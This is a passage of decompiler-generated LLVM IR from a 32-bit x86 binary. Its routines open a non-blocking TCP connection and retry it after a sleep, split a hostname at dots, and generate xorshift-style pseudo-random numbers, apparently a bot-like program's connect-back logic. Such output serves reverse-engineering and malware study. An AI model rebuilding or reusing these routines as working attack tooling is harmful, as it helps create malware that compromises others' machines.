  %v14_804ed09 = icmp eq i32 %v2_804ed09, %v1_804ed08
  br i1 %v14_804ed09, label %dec_label_pc_804ec5a, label %dec_label_pc_804ec12

dec_label_pc_804ed18:                             ; preds = %dec_label_pc_804ec3a
  %v1_804ed18 = add i32 %v0_804ed18128, 1
  %v12_804ed19 = icmp eq i32 %v3_804ec18, %v1_804ed18
  br i1 %v12_804ed19, label %dec_label_pc_804ec5a, label %dec_label_pc_804ec30.backedge

dec_label_pc_804ec30.backedge:                    ; preds = %dec_label_pc_804ed18, %dec_label_pc_804ec49
  %v3_804ec4091 = phi i32 [ 0, %dec_label_pc_804ec49 ], [ %v1_804ed18, %dec_label_pc_804ed18 ]
  %storemerge32.in = add i32 %v0_804ed21129, 1
  %v1_804ec30 = add i32 %v1_804ec30131, -1
  store i32 %v1_804ec30, i32* @ebx, align 4
  %v10_804ec31 = icmp eq i32 %v1_804ec30131, 0
  br i1 %v10_804ec31, label %dec_label_pc_804eb1c, label %dec_label_pc_804ec3a

dec_label_pc_804ed27:                             ; preds = %dec_label_pc_804eb1c
  %v2_804ed2a = inttoptr i32 %v0_804eb31 to i32*
  store i32 12, i32* %v2_804ed2a, align 4
  %v2_804ed2c = call i32 @function_8051c10(i8 0)
  store i32 %v2_804ed2c, i32* %eax.global-to-local, align 4
  %v0_804ed31 = load i32, i32* @esp, align 4
  %v1_804ed31 = inttoptr i32 %v0_804ed31 to i32*
  store i32 13, i32* %v1_804ed31, align 4
  %v2_804ed38 = call i32 @function_8051c10(i8 0)
  store i32 %v2_804ed38, i32* %eax.global-to-local, align 4
  %v0_804ed3d = load i32, i32* @esp, align 4
  %v1_804ed3d = inttoptr i32 %v0_804ed3d to i32*
  store i32 14, i32* %v1_804ed3d, align 4
  %v2_804ed44 = call i32 @function_8051c10(i8 0)
  store i32 %v2_804ed44, i32* %eax.global-to-local, align 4
  %v0_804ed49 = load i32, i32* @esp, align 4
  %v1_804ed49 = inttoptr i32 %v0_804ed49 to i32*
  store i32 15, i32* %v1_804ed49, align 4
  %v2_804ed50 = call i32 @function_8051c10(i8 0)
  store i32 %v2_804ed50, i32* %eax.global-to-local, align 4
  %v0_804ed55 = load i32, i32* @esp, align 4
  %v1_804ed55 = inttoptr i32 %v0_804ed55 to i32*
  store i32 16, i32* %v1_804ed55, align 4
  %v2_804ed5c = call i32 @function_8051c10(i8 0)
  store i32 %v2_804ed5c, i32* %eax.global-to-local, align 4
  %v0_804ed61 = load i32, i32* @esp, align 4
  %v1_804ed61 = inttoptr i32 %v0_804ed61 to i32*
  %v2_804ed61 = load i32, i32* %v1_804ed61, align 4
  store i32 %v2_804ed61, i32* %eax.global-to-local, align 4
  %v1_804ed62 = add i32 %v0_804ed61, 56
  %v2_804ed62 = inttoptr i32 %v1_804ed62 to i32*
  %v3_804ed62 = load i32, i32* %v2_804ed62, align 4
  store i32 %v3_804ed62, i32* @edi, align 4
  store i32 %v3_804ed62, i32* %v1_804ed61, align 4
  %v1_804ed67 = call i32 @function_8052b81(i32 0)
  store i32 %v1_804ed67, i32* @eax, align 4
  %v0_804ed6c = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ecac

; uselistorder directives
  uselistorder i32 %v1_804ec30, { 1, 0 }
  uselistorder i32 %v6_804ec3e, { 2, 0, 1 }
  uselistorder i32 %v0_804ed21129, { 1, 0 }
  uselistorder i32 %v2_804ec1f, { 1, 0 }
  uselistorder i32 %v3_804ec18, { 1, 0, 2 }
  uselistorder i32 %v0_804eb1c52, { 2, 1, 0 }
  uselistorder i32 %v0_804ec27, { 0, 4, 5, 6, 3, 2, 1 }
  uselistorder i32 %v6_804ec04, { 0, 2, 1 }
  uselistorder i32 %v0_804ed08, { 1, 0 }
  uselistorder i32 %v0_804ebf3, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804ebea, { 1, 0 }
  uselistorder i32 %v1_804ebea, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_804ebea, { 1, 2, 3, 4, 7, 0, 8, 5, 6, 9 }
  uselistorder i32 %v0_804ebe0, { 1, 0 }
  uselistorder i32 %v6_804ebcc, { 1, 0 }
  uselistorder i32 %v0_804ecf8, { 1, 0 }
  uselistorder i32 %v0_804ebbf, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804ebb6, { 1, 0 }
  uselistorder i32 %v0_804ebb6, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_804ebac, { 1, 0 }
  uselistorder i32 %v6_804eb98, { 1, 0 }
  uselistorder i32 %v0_804ece8, { 1, 0 }
  uselistorder i32 %v0_804eb8b, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804eb82, { 1, 0 }
  uselistorder i32 %v0_804eb82, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_804eb78, { 1, 0 }
  uselistorder i32 %v6_804eb64, { 1, 0 }
  uselistorder i32 %v0_804ec50, { 1, 0 }
  uselistorder i32 %v0_804eb51, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804eb48, { 1, 0 }
  uselistorder i32 %v0_804eb48, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_804eb1c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804ea57, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804ea34, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v3_804ea2f, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804e9ca, { 1, 0 }
  uselistorder i32 %v0_804e9c1, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804e9bc, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804e9ca.pre, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_804e9a3, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_804e96a, { 0, 2, 1 }
  uselistorder i32 %v4_804e925, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804e8ca, { 2, 1, 0 }
  uselistorder i32 %v0_804e884, { 1, 0, 2 }
  uselistorder i32 %v1_804e831, { 1, 0 }
  uselistorder i32 %v1_804e82e, { 2, 1, 0 }
  uselistorder i32 %v0_804e82e, { 1, 0, 2 }
  uselistorder i32 %v2_804e82c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804e848, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804e7fd, { 1, 0 }
  uselistorder i32 %v1_804e7fa, { 1, 0, 2 }
  uselistorder i32 %v0_804e7ed, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804e7e8, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_804e7e0, { 1, 0 }
  uselistorder i32 %v3_804e715, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804e6d3, { 1, 0, 2 }
  uselistorder i32 %v2_804e6bf, { 3, 2, 4, 0, 5, 6, 7, 8, 1, 9, 10 }
  uselistorder i32 %v1_804e682, { 0, 2, 1 }
  uselistorder i32 %v3_804e644, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v3_804e5f7, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804e5a3, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-52, { 1, 2, 0 }
  uselistorder i32* %eax.global-to-local, { 129, 130, 131, 132, 133, 134, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 135, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128 }
  uselistorder i32 8424, { 1, 0 }
  uselistorder i32 ()* @function_8052ed4, { 2, 1, 0 }
  uselistorder i32 ()* @function_8052950, { 3, 2, 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_80528d0, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 18, 19, 20, 21, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 8264, { 0, 2, 1 }
  uselistorder i32 8328, { 0, 1, 3, 2 }
  uselistorder i32 ()* @function_8053035, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @function_8052f44, { 2, 1, 0 }
  uselistorder i32 4095, { 1, 0 }
  uselistorder i32 (i8*, i32)* @function_8052600, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 27, 28, 29, 30, 26, 31, 32, 33, 34, 58, 59, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 60, 61, 62, 63 }
  uselistorder i8 7, { 3, 4, 5, 6, 7, 1, 2, 0 }
  uselistorder label %dec_label_pc_804ecac, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804ec5a, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804ec3a, { 1, 0 }
  uselistorder label %dec_label_pc_804ec18, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ec00, { 1, 0 }
  uselistorder label %dec_label_pc_804ebe0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ebc8, { 1, 0 }
  uselistorder label %dec_label_pc_804ebac, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804eb94, { 1, 0 }
  uselistorder label %dec_label_pc_804eb78, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804eb60, { 1, 0 }
  uselistorder label %dec_label_pc_804eb1c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804ea57, { 1, 0 }
  uselistorder label %dec_label_pc_804ea4b, { 1, 0 }
  uselistorder label %dec_label_pc_804e9c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e98d, { 1, 0 }
  uselistorder label %dec_label_pc_804e7e0, { 6, 3, 1, 0, 4, 5, 2, 7 }
  uselistorder label %dec_label_pc_804e772, { 1, 0 }
  uselistorder label %dec_label_pc_804e671, { 1, 0 }
  uselistorder label %dec_label_pc_804e624, { 1, 0 }
}

define i32 @function_804ed80() local_unnamed_addr {
dec_label_pc_804ed80:
  store i32 134541008, i32* @global_var_8057194.24, align 4
  %v0_804ed8a = load i32, i32* @eax, align 4
  ret i32 %v0_804ed8a
}

define i32 @function_804ed90() local_unnamed_addr {
dec_label_pc_804ed90:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 1, i32* %stack_var_-12, align 4
  %v3_804eda3 = call i32 @function_8053375(i32 2, i32 1, i32 0)
  store i32 %v3_804eda3, i32* @global_var_805718c.25, align 4
  %v10_804edb2 = icmp eq i32 %v3_804eda3, -1
  br i1 %v10_804edb2, label %dec_label_pc_804ee50, label %dec_label_pc_804edbb

dec_label_pc_804edbb:                             ; preds = %dec_label_pc_804ed90
  %v2_804edc0 = ptrtoint i32* %stack_var_-12 to i32
  %v5_804edca = call i32 @function_805333a(i32 %v3_804eda3, i32 1, i32 2, i32 %v2_804edc0, i32 4)
  %v0_804edd2 = load i32, i32* @global_var_805718c.25, align 4
  %v3_804eddc = call i32 @function_8052abd(i32 %v0_804edd2, i32 3, i32 0)
  %v12_804ede4 = or i32 %v3_804eddc, 2048
  %v0_804ede8 = load i32, i32* @global_var_805718c.25, align 4
  %v3_804edf0 = call i32 @function_8052abd(i32 %v0_804ede8, i32 4, i32 %v12_804ede4)
  %v0_804edfd = load i8, i8* @global_var_8057198.26, align 8
  %v1_804edfd = icmp eq i8 %v0_804edfd, 0
  br i1 %v1_804edfd, label %dec_label_pc_804ee56, label %dec_label_pc_804ee06

dec_label_pc_804ee06:                             ; preds = %dec_label_pc_804edbb, %dec_label_pc_804ee56
  store i32 2, i32* %stack_var_-28, align 4
  %v1_804ee18 = call i32 @function_80530b9(i32 2)
  %v2_804ee1d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v1_804ee18, i32* @ebx, align 4
  %v1_804ee23 = inttoptr i32 %v1_804ee18 to i32*
  store i32 0, i32* %v1_804ee23, align 4
  %v0_804ee2a = load i32, i32* @global_var_805718c.25, align 4
  %v4_804ee33 = call i32 @function_805316f(i32 %v0_804ee2a, i32 %v2_804ee1d, i32 16, i32 %v1_804ee18)
  %v8_804ee3b = icmp eq i32 %v4_804ee33, -1
  br i1 %v8_804ee3b, label %dec_label_pc_804ee60, label %dec_label_pc_804ee3e

dec_label_pc_804ee3e:                             ; preds = %dec_label_pc_804ee06
  %v0_804ee3e = load i32, i32* @global_var_805718c.25, align 4
  %v2_804ee48 = call i32 @function_805322b(i32 %v0_804ee3e, i32 1)
  br label %dec_label_pc_804ee50

dec_label_pc_804ee50:                             ; preds = %dec_label_pc_804ed90, %dec_label_pc_804ee3e
  %v0_804ee55 = phi i32 [ -1, %dec_label_pc_804ed90 ], [ %v2_804ee48, %dec_label_pc_804ee3e ]
  ret i32 %v0_804ee55

dec_label_pc_804ee56:                             ; preds = %dec_label_pc_804edbb
  br label %dec_label_pc_804ee06

dec_label_pc_804ee60:                             ; preds = %dec_label_pc_804ee06
  %v0_804ee60 = load i32, i32* @ebx, align 4
  %v1_804ee60 = inttoptr i32 %v0_804ee60 to i32*
  %v2_804ee60 = load i32, i32* %v1_804ee60, align 4
  %v11_804ee60 = icmp eq i32 %v2_804ee60, 99
  br i1 %v11_804ee60, label %dec_label_pc_804eebe, label %dec_label_pc_804ee65

dec_label_pc_804ee65:                             ; preds = %dec_label_pc_804ee60, %dec_label_pc_804eebe
  store i32 2, i32* %stack_var_-28, align 4
  %v0_804ee7f = load i32, i32* @global_var_805718c.25, align 4
  store i32 %v0_804ee7f, i32* @esi, align 4
  %v3_804ee86 = call i32 @function_805319a(i32 %v0_804ee7f, i32 %v2_804ee1d, i32 16)
  %v1_804ee92 = call i32 @function_8054730(i32 5)
  store i32 5, i32* @ebx, align 4
  %v0_804ee98 = load i32, i32* @global_var_805718c.25, align 4
  %v1_804ee9f = call i32 @function_8052b81(i32 %v0_804ee98)
  %v1_804eeab = call i32 @function_804df70(i32 58811)
  %v0_804eeb0 = call i32 @function_804ed90()
  ret i32 %v0_804eeb0

dec_label_pc_804eebe:                             ; preds = %dec_label_pc_804ee60
  store i8 0, i8* @global_var_8057198.26, align 8
  br label %dec_label_pc_804ee65

; uselistorder directives
  uselistorder i32 %v3_804eda3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_804df70, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_805322b, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_805316f, { 2, 1, 0 }
  uselistorder i8* @global_var_8057198.26, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_805333a, { 1, 0 }
  uselistorder label %dec_label_pc_804ee65, { 1, 0 }
  uselistorder label %dec_label_pc_804ee50, { 1, 0 }
  uselistorder label %dec_label_pc_804ee06, { 1, 0 }
}

define i32 @function_804eed0() local_unnamed_addr {
dec_label_pc_804eed0:
  %stack_var_-12 = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp4, i32* %stack_var_-12, align 4
  %stack_var_-28 = alloca i8*, align 4
  store i8* inttoptr (i32 3 to i8*), i8** %stack_var_-28, align 4
  %v3_804eed7 = call i32 @function_8051c90(i8 3)
  store i8* inttoptr (i32 3 to i8*), i8** %stack_var_-28, align 4
  %v4_804eee2 = call i32 @function_8051be0(i32 3, i32* null)
  %v4_804eee7 = inttoptr i32 %v4_804eee2 to i8*
  store i8* %v4_804eee7, i8** %stack_var_-28, align 4
  %v3_804eeea = call i32 @function_804fcd0(i8* %v4_804eee7)
  store i32 %v3_804eeea, i32* @esi, align 4
  store i8* inttoptr (i32 3 to i8*), i8** %stack_var_-28, align 4
  %v3_804eef8 = call i32 @function_8051c10(i8 3)
  %v2_804ef00 = icmp eq i32 %v3_804eeea, 0
  br i1 %v2_804ef00, label %dec_label_pc_804ef56, label %dec_label_pc_804ef04

dec_label_pc_804ef04:                             ; preds = %dec_label_pc_804eed0
  %v1_804eeef = inttoptr i32 %v3_804eeea to i8*
  %v2_804ef04 = add i32 %v3_804eeea, 4
  %v3_804ef04 = inttoptr i32 %v2_804ef04 to i32*
  %v4_804ef04 = load i32, i32* %v3_804ef04, align 4
  store i32 %v4_804ef04, i32* @ebx, align 4
  %v0_804ef07 = load i8*, i8** %stack_var_-28, align 4
  %v1_804ef07 = ptrtoint i8* %v0_804ef07 to i32
  %v2_804ef07 = call i32 @function_804fa00(i32 %v1_804ef07)
  %v3_804ef07 = sext i32 %v2_804ef07 to i64
  %v3_804ef11 = load i8, i8* %v1_804eeef, align 1
  %v8_804ef17 = zext i8 %v3_804ef11 to i64
  %v11_804ef17 = urem i64 %v3_804ef07, %v8_804ef17
  %v12_804ef17 = trunc i64 %v11_804ef17 to i32
  %v0_804ef19 = load i32, i32* @ebx, align 4
  %v2_804ef19 = mul nuw nsw i32 %v12_804ef17, 4
  %v3_804ef19 = add i32 %v2_804ef19, %v0_804ef19
  %v4_804ef19 = inttoptr i32 %v3_804ef19 to i32*
  %v5_804ef19 = load i32, i32* %v4_804ef19, align 4
  %tmp10 = bitcast i8** %stack_var_-28 to i32*
  store i32 %v3_804eeea, i32* %tmp10, align 4
  store i32 %v5_804ef19, i32* @global_var_80572ec.28, align 4
  %v2_804ef22 = call i32 @function_804fc90(i32 %v3_804eeea)
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-28, align 4
  %v3_804ef2e = call i32 @function_8051c90(i8 4)
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-28, align 4
  %v4_804ef39 = call i32 @function_8051be0(i32 4, i32* null)
  %v5_804ef39 = inttoptr i32 %v4_804ef39 to i16*
  %v3_804ef3e = load i16, i16* %v5_804ef39, align 2
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-28, align 4
  store i16 %v3_804ef3e, i16* bitcast (i32* @global_var_80572ea.29 to i16*), align 4
  %v3_804ef4e = call i32 @function_8051c10(i8 4)
  %v2_804ef56.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804ef56

dec_label_pc_804ef56:                             ; preds = %dec_label_pc_804eed0, %dec_label_pc_804ef04
  %v2_804ef56 = phi i32 [ %tmp4, %dec_label_pc_804eed0 ], [ %v2_804ef56.pre, %dec_label_pc_804ef04 ]
  ret i32 %v2_804ef56

; uselistorder directives
  uselistorder i32 %v3_804eeea, { 2, 1, 0, 5, 3, 4 }
  uselistorder i8** %stack_var_-28, { 7, 6, 5, 0, 8, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_804ef56, { 1, 0 }
}

define i32 @function_804fa00(i32 %arg1) local_unnamed_addr {
dec_label_pc_804fa00:
  %v0_804fa00 = load i32, i32* @global_var_8057268.30, align 8
  %v0_804fa08 = load i32, i32* @global_var_8057274.31, align 4
  %v2_804fa0e = mul i32 %v0_804fa00, 2048
  %v2_804fa13 = udiv i32 %v0_804fa08, 524288
  store i32 %v2_804fa13, i32* @ecx, align 4
  %v2_804fa16 = xor i32 %v2_804fa0e, %v0_804fa00
  %v0_804fa18 = load i32, i32* @global_var_805726c.32, align 4
  store i32 %v0_804fa18, i32* @global_var_8057268.30, align 8
  %v0_804fa22 = load i32, i32* @global_var_8057270.33, align 16
  store i32 %v0_804fa22, i32* @global_var_805726c.32, align 4
  store i32 %v0_804fa08, i32* @global_var_8057270.33, align 16
  %v2_804fa34 = xor i32 %v2_804fa13, %v0_804fa08
  %v2_804fa36 = udiv i32 %v2_804fa16, 256
  %v2_804fa39 = xor i32 %v2_804fa36, %v2_804fa16
  %v2_804fa3b = xor i32 %v2_804fa39, %v2_804fa34
  store i32 %v2_804fa3b, i32* @global_var_8057274.31, align 4
  ret i32 %v2_804fa3b

; uselistorder directives
  uselistorder i32 %v2_804fa16, { 1, 0 }
  uselistorder i32 %v2_804fa13, { 1, 0 }
  uselistorder i32 %v0_804fa08, { 1, 2, 0 }
  uselistorder i32 %v0_804fa00, { 1, 0 }
}

define i32 @function_804fc90(i32 %arg1) local_unnamed_addr {
dec_label_pc_804fc90:
  %stack_var_-12 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-12, align 4
  %v0_804fc90 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804fc98 = icmp eq i32 %arg1, 0
  br i1 %v1_804fc98, label %dec_label_pc_804fc90.dec_label_pc_804fcc0_crit_edge, label %dec_label_pc_804fc9c

dec_label_pc_804fc90.dec_label_pc_804fcc0_crit_edge: ; preds = %dec_label_pc_804fc90
  br label %dec_label_pc_804fcc0

dec_label_pc_804fc9c:                             ; preds = %dec_label_pc_804fc90
  %v1_804fc9c = add i32 %arg1, 4
  %v2_804fc9c = inttoptr i32 %v1_804fc9c to i32*
  %v3_804fc9c = load i32, i32* %v2_804fc9c, align 4
  %v1_804fc9f = icmp eq i32 %v3_804fc9c, 0
  br i1 %v1_804fc9f, label %dec_label_pc_804fcaf, label %dec_label_pc_804fca3

dec_label_pc_804fca3:                             ; preds = %dec_label_pc_804fc9c
  %v1_804fca7 = call i32 @function_80542d9(i32 %v3_804fc9c)
  br label %dec_label_pc_804fcaf

dec_label_pc_804fcaf:                             ; preds = %dec_label_pc_804fc9c, %dec_label_pc_804fca3
  store i32 %v0_804fc90, i32* @ebx, align 4
  %v1_804fcb6 = call i32 @function_80542d9(i32 %arg1)
  %v2_804fcc0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804fcc0

dec_label_pc_804fcc0:                             ; preds = %dec_label_pc_804fc90.dec_label_pc_804fcc0_crit_edge, %dec_label_pc_804fcaf
  %v2_804fcc0 = phi i32 [ %tmp12, %dec_label_pc_804fc90.dec_label_pc_804fcc0_crit_edge ], [ %v2_804fcc0.pre, %dec_label_pc_804fcaf ]
  store i32 %v0_804fc90, i32* @ebx, align 4
  ret i32 %v2_804fcc0

; uselistorder directives
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804fcc0, { 1, 0 }
  uselistorder label %dec_label_pc_804fcaf, { 1, 0 }
}

define i32 @function_804fcd0(i8* %arg1) local_unnamed_addr {
dec_label_pc_804fcd0:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-2207 = alloca i32, align 4
  %stack_var_-2208 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v4_804fcdc = ptrtoint i8* %arg1 to i32
  store i32 %v4_804fcdc, i32* @ebx, align 4
  %v4_804fce7 = call i32 @function_8053c88(i64 1, i32 8)
  %v2_804fcf0 = ptrtoint i32* %stack_var_-2208 to i32
  store i32 %v2_804fcf0, i32* %eax.global-to-local, align 4
  %tmp102 = bitcast i32* %stack_var_-2208 to i8*
  %v0_804fcfb = load i32, i32* @ebx, align 4
  %v4_804fcfb = inttoptr i32 %v0_804fcfb to i8*
  %v3_804fcfe = call i32 @function_80525e0(i8* %v4_804fcfb)
  %v2_804fd03 = ptrtoint i32* %stack_var_-2207 to i32
  store i32 %v2_804fd03, i32* %ecx.global-to-local, align 4
  store i32 %v2_804fcf0, i32* %edi.global-to-local, align 4
  %v1_804fd0e = add i32 %v3_804fcfe, 1
  store i32 %v1_804fd0e, i32* %eax.global-to-local, align 4
  %tmp103 = icmp slt i32 %v1_804fd0e, 1
  br i1 %tmp103, label %dec_label_pc_804fd3a, label %dec_label_pc_804fd22.lr.ph

dec_label_pc_804fd22.lr.ph:                       ; preds = %dec_label_pc_804fcd0
  %v0_804fd22.pre = load i32, i32* @ebx, align 4
  %v4_804fd22.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804fd22

dec_label_pc_804fd14:                             ; preds = %dec_label_pc_804fd29
  %v3_804fd14 = inttoptr i32 %v2_804fd14 to i8*
  store i8 %v2_804fd22, i8* %v3_804fd14, align 1
  %v0_804fd16 = load i32, i32* @esi, align 4
  %v1_804fd16 = add i32 %v0_804fd16, 1
  store i32 %v1_804fd16, i32* @esi, align 4
  %v0_804fd17 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804fd17 = add i32 %v0_804fd17, 1
  store i32 %v1_804fd17, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804fd1a

dec_label_pc_804fd1a:                             ; preds = %dec_label_pc_804fd2d, %dec_label_pc_804fd14
  %v0_804fd1c = phi i32 [ %v1_804fd33, %dec_label_pc_804fd2d ], [ %v1_804fd17, %dec_label_pc_804fd14 ]
  %v0_804fd1a = load i32, i32* @ebx, align 4
  %v1_804fd1a = add i32 %v0_804fd1a, 1
  store i32 %v1_804fd1a, i32* @ebx, align 4
  %v0_804fd1b = load i32, i32* %eax.global-to-local, align 4
  %v1_804fd1b = add i32 %v0_804fd1b, -1
  store i32 %v1_804fd1b, i32* %eax.global-to-local, align 4
  store i32 %v0_804fd1c, i32* %ecx.global-to-local, align 4
  %tmp104 = icmp slt i32 %v1_804fd1b, 1
  br i1 %tmp104, label %dec_label_pc_804fd1e.dec_label_pc_804fd3a_crit_edge, label %dec_label_pc_804fd22

dec_label_pc_804fd22:                             ; preds = %dec_label_pc_804fd22.lr.ph, %dec_label_pc_804fd1a
  %v2_804fd14 = phi i32 [ %v2_804fd03, %dec_label_pc_804fd22.lr.ph ], [ %v0_804fd1c, %dec_label_pc_804fd1a ]
  %v4_804fd22 = phi i32 [ %v4_804fd22.pre, %dec_label_pc_804fd22.lr.ph ], [ %v0_804fd1c, %dec_label_pc_804fd1a ]
  %v0_804fd22 = phi i32 [ %v0_804fd22.pre, %dec_label_pc_804fd22.lr.ph ], [ %v1_804fd1a, %dec_label_pc_804fd1a ]
  %v1_804fd22 = inttoptr i32 %v0_804fd22 to i8*
  %v2_804fd22 = load i8, i8* %v1_804fd22, align 1
  %v3_804fd22 = zext i8 %v2_804fd22 to i32
  %v5_804fd22 = and i32 %v4_804fd22, -256
  %v6_804fd22 = or i32 %v3_804fd22, %v5_804fd22
  store i32 %v6_804fd22, i32* %edx.global-to-local, align 4
  %v10_804fd24 = icmp eq i8 %v2_804fd22, 46
  br i1 %v10_804fd24, label %dec_label_pc_804fd2d, label %dec_label_pc_804fd29

dec_label_pc_804fd29:                             ; preds = %dec_label_pc_804fd22
  %v4_804fd29 = icmp eq i8 %v2_804fd22, 0
  %v1_804fd2b = icmp eq i1 %v4_804fd29, false
  br i1 %v1_804fd2b, label %dec_label_pc_804fd14, label %dec_label_pc_804fd2d

dec_label_pc_804fd2d:                             ; preds = %dec_label_pc_804fd29, %dec_label_pc_804fd22
  %v0_804fd2d = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v1_804fd31 = trunc i32 %v0_804fd2d to i8
  %v2_804fd31 = load i32, i32* %edi.global-to-local, align 4
  %v3_804fd31 = inttoptr i32 %v2_804fd31 to i8*
  store i8 %v1_804fd31, i8* %v3_804fd31, align 1
  %v0_804fd33 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804fd33 = add i32 %v0_804fd33, 1
  store i32 %v1_804fd33, i32* %edx.global-to-local, align 4
  store i32 %v0_804fd33, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fd1a

dec_label_pc_804fd1e.dec_label_pc_804fd3a_crit_edge: ; preds = %dec_label_pc_804fd1a
  br label %dec_label_pc_804fd3a

dec_label_pc_804fd3a:                             ; preds = %dec_label_pc_804fd1e.dec_label_pc_804fd3a_crit_edge, %dec_label_pc_804fcd0
  %v0_804fd3d = phi i32 [ %v0_804fd1c, %dec_label_pc_804fd1e.dec_label_pc_804fd3a_crit_edge ], [ %v2_804fd03, %dec_label_pc_804fcd0 ]
  %v1_804fd3d = inttoptr i32 %v0_804fd3d to i8*
  store i8 0, i8* %v1_804fd3d, align 1
  store i32 %v2_804fcf0, i32* %eax.global-to-local, align 4
  %v3_804fd45 = call i32 @function_80525e0(i8* %tmp102)
  store i32 0, i32* %stack_var_-44, align 4
  %v2_804fd59 = add i32 %v3_804fd45, %v2_804fcf0
  store i32 %v2_804fd59, i32* @edi, align 4
  %v1_804fd7d = add i32 %v2_804fd59, 1
  store i32 %v1_804fd7d, i32* @ebx, align 4
  store i32 %v2_804fcf0, i32* %eax.global-to-local, align 4
  %v3_804fd85 = call i32 @function_80525e0(i8* %tmp102)
  %v1_804fd8a = add i32 %v3_804fd85, 17
  store i32 %v1_804fd8a, i32* %eax.global-to-local, align 4
  %v1_804fd91 = call i32 @function_804fa00(i32 %v1_804fd8a)
  %v2_804fd9f = udiv i32 %v1_804fd91, 65535
  store i32 %v2_804fd9f, i32* %edx.global-to-local, align 4
  %v2_804fda979 = add i32 %v2_804fd9f, %v1_804fd91
  store i32 %v2_804fda979, i32* @esi, align 4
  store i32 8, i32* @eax, align 4
  store i32 -1, i32* %ebp.global-to-local, align 4
  %v2_804fdb9 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804fdb9, i32* %ecx.global-to-local, align 4
